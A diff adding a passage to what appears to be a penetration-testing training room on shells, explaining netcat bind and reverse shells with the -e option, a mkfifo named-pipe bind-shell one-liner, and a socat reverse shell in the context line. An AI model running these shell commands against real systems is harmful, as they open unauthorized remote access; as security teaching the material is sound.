@@ -373,3 +373,19 @@ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.  
 
 ---
+
+A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection. For example, as a listener:
+
+nc -lvnp <PORT> -e /bin/bash
+
+Connecting to the above listener with netcat would result in a bind shell on the target.
+
+Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.
+
+However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
+
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.
+
+_The command first creates a named pipe(opens in new tab) at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._
